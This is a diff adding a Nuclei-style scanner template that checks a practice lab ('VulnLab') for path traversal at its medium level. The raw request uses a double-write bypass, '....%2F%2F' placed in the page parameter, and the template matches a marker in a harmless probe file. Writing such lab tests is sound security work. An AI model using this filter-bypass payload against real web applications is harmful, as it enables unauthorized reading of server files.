@@ -1,0 +1,22 @@
+id: vulnlab-lfi-medium
+
+info:
+  name: VulnLab 路径穿越 medium 档（双写绕过）
+  author: hediwen
+  severity: high
+  tags: vulnlab,lfi
+
+http:
+  - raw:
+      - |
+        GET /lfi/medium.php?page=....%2F%2F....%2F%2Flfi_probe.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "VULNLAB_LFI_PROBE_MARKER"
+
